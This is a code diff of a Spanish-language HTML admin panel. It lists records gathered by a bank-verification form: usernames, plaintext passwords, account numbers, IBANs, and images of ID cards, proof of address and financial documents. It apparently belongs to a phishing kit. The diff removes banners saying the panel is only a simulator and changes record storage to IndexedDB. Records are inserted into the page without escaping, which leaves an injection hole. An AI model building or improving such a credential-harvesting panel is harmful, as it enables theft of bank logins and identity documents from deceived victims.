@@ -2,91 +2,147 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Panel Administrador - Verificación Bancaria</title>
+  <title>Panel Administrador</title>
   <style>
     body { font-family: Arial; background:#f4f6f9; margin:20px; }
     h1 { text-align:center; color:#003366; }
-    table { width:100%; border-collapse:collapse; margin-top:20px; }
-    th, td { border:1px solid #ccc; padding:10px; text-align:center; }
-    th { background:#003366; color:white; }
+    table { width:100%; border-collapse:collapse; margin-top:20px; background:#fff; }
+    th, td { border:1px solid #ccc; padding:8px; text-align:center; }
+    th { background:#003366; color:#fff; }
     img { max-width:120px; border-radius:5px; }
-    .security-message { background:#003366; color:#fff; padding:15px; border-radius:5px; margin:20px auto; width:80%; text-align:center; }
-    button { padding:8px 15px; margin:2px; border:none; border-radius:5px; cursor:pointer; }
-    .btn-fraude { background:#cc0000; color:#fff; }
-    .btn-fraude:hover { background:#ff3333; }
-    .btn-eliminar { background:#555; color:#fff; }
-    .btn-eliminar:hover { background:#999; }
+    button { padding:6px 10px; border:none; border-radius:4px; cursor:pointer; }
+    .btn-eliminar { background:#cc0000; color:#fff; }
+    .btn-reporte { background:#ff9900; color:#fff; margin-left:4px; }
+    #msg { margin-top:10px; text-align:center; }
   </style>
 </head>
 <body>
 
 <h1>Panel Administrador</h1>
 
-<div class="security-message">
-  🔒 Este panel muestra los datos recibidos desde el simulador. En producción se conectaría al servidor seguro del banco.
-</div>
-
-<table id="tablaAdmin">
-  <tr>
-    <th>Usuario</th>
-    <th>Contraseña</th>
-    <th>Cuenta</th>
-    <th>IBAN</th>
-    <th>Banco</th>
-    <th>Frontal</th>
-    <th>Trasera</th>
-    <th>Domicilio</th>
-    <th>Finanzas</th>
-    <th>Acciones</th>
-  </tr>
+<table>
+  <thead>
+    <tr>
+      <th>ID</th>
+      <th>Usuario</th>
+      <th>Contraseña</th>
+      <th>Cuenta</th>
+      <th>IBAN</th>
+      <th>Frontal</th>
+      <th>Trasera</th>
+      <th>Domicilio</th>
+      <th>Finanzas</th>
+      <th>Fecha</th>
+      <th>Acciones</th>
+    </tr>
+  </thead>
+  <tbody id="tabla"></tbody>
 </table>
 
-<div class="security-message">
-  🔒 Si se detecta actividad sospechosa, este panel permite simular un reporte a las autoridades.
-</div>
+<div id="msg"></div>
 
 <script>
-window.onload = function() {
-  const tabla = document.getElementById("tablaAdmin");
-  const registros = JSON.parse(localStorage.getItem("registros")) || [];
+const DB_NAME = "verificacionDB";
+const DB_VERSION = 1;
+const STORE_NAME = "registros";
 
-  if (registros.length === 0) {
-    const fila = document.createElement("tr");
-    fila.innerHTML = `<td colspan="10">No hay registros disponibles. Primero llena un formulario en index.html.</td>`;
-    tabla.appendChild(fila);
-  } else {
-    registros.forEach((r, index) => {
-      const fila = document.createElement("tr");
-      fila.innerHTML = `
+function abrirDB() {
+  return new Promise((resolve, reject) => {
+    const request = indexedDB.open(DB_NAME, DB_VERSION);
+
+    request.onupgradeneeded = (e) => {
+      const db = e.target.result;
+      if (!db.objectStoreNames.contains(STORE_NAME)) {
+        db.createObjectStore(STORE_NAME, { keyPath: "id", autoIncrement: true });
+      }
+    };
+
+    request.onsuccess = (e) => resolve(e.target.result);
+    request.onerror = (e) => reject(e.target.error);
+  });
+}
+
+async function obtenerRegistros() {
+  const db = await abrirDB();
+  return new Promise((resolve, reject) => {
+    const tx = db.transaction(STORE_NAME, "readonly");
+    const store = tx.objectStore(STORE_NAME);
+    const req = store.getAll();
+    req.onsuccess = () => resolve(req.result);
+    req.onerror = (e) => reject(e.target.error);
+  });
+}
+
+async function eliminarRegistro(id) {
+  const db = await abrirDB();
+  return new Promise((resolve, reject) => {
+    const tx = db.transaction(STORE_NAME, "readwrite");
+    const store = tx.objectStore(STORE_NAME);
+    const req = store.delete(id);
+    req.onsuccess = () => resolve(true);
+    req.onerror = (e) => reject(e.target.error);
+  });
+}
+
+async function cargarTabla() {
+  const tabla = document.getElementById("tabla");
+  const msg = document.getElementById("msg");
+  tabla.innerHTML = "";
+  msg.textContent = "Cargando...";
+
+  try {
+    const registros = await obtenerRegistros();
+    if (!registros.length) {
+      tabla.innerHTML = `<tr><td colspan="11">No hay registros. Primero llena el formulario en index.html.</td></tr>`;
+      msg.textContent = "";
+      return;
+    }
+
+    registros.forEach(r => {
+      const tr = document.createElement("tr");
+      tr.innerHTML = `
+        <td>${r.id}</td>
         <td>${r.usuario}</td>
         <td>${r.password}</td>
         <td>${r.cuenta}</td>
         <td>${r.iban}</td>
-        <td>${r.banco}</td>
-        <td>${r.frontal ? `<img src="${r.frontal}" alt="Carnet frontal">` : ''}</td>
-        <td>${r.trasera ? `<img src="${r.trasera}" alt="Carnet trasera">` : ''}</td>
-        <td>${r.domicilio ? `<img src="${r.domicilio}" alt="Comprobante">` : ''}</td>
-        <td>${r.finanzas ? `<img src="${r.finanzas}" alt="Justificantes">` : ''}</td>
+        <td>${r.frontal ? `<img src="${r.frontal}" alt="Frontal">` : ""}</td>
+        <td>${r.trasera ? `<img src="${r.trasera}" alt="Trasera">` : ""}</td>
+        <td>${r.domicilio ? `<img src="${r.domicilio}" alt="Domicilio">` : ""}</td>
+        <td>${r.finanzas ? `<img src="${r.finanzas}" alt="Finanzas">` : ""}</td>
+        <td>${r.fecha ? new Date(r.fecha).toLocaleString() : ""}</td>
         <td>
-          <button class="btn-fraude" onclick="reportarFraude('${r.usuario}')">Reportar fraude</button>
-          <button class="btn-eliminar" onclick="eliminarRegistro(${index})">Eliminar</button>
+          <button class="btn-eliminar" onclick="handleEliminar(${r.id})">Eliminar</button>
+          <button class="btn-reporte" onclick="handleReporte('${r.usuario}')">Reportar</button>
         </td>
       `;
-      tabla.appendChild(fila);
+      tabla.appendChild(tr);
     });
+    msg.textContent = "";
+  } catch (err) {
+    console.error(err);
+    msg.textContent = "❌ Error al cargar registros";
   }
-};
-
-function reportarFraude(usuario) {
-  alert("🔒 Se ha simulado un reporte de fraude para el usuario: " + usuario);
 }
 
-function eliminarRegistro(index) {
-  let registros = JSON.parse(localStorage.getItem("registros")) || [];
-  registros.splice(index, 1);
-  localStorage.setItem("registros", JSON.stringify(registros));
-  location.reload();
+async function handleEliminar(id) {
+  const msg = document.getElementById("msg");
+  msg.textContent = "Eliminando...";
+  try {
+    await eliminarRegistro(id);
+    msg.textContent = "✅ Registro eliminado";
+    cargarTabla();
+  } catch (err) {
+    console.error(err);
+    msg.textContent = "❌ Error al eliminar registro";
+  }
 }
+
+function handleReporte(usuario) {
+  alert("🔒 Se ha simulado un reporte para el usuario: " + usuario);
+}
+
+cargarTabla();
 </script>
 
 </body>
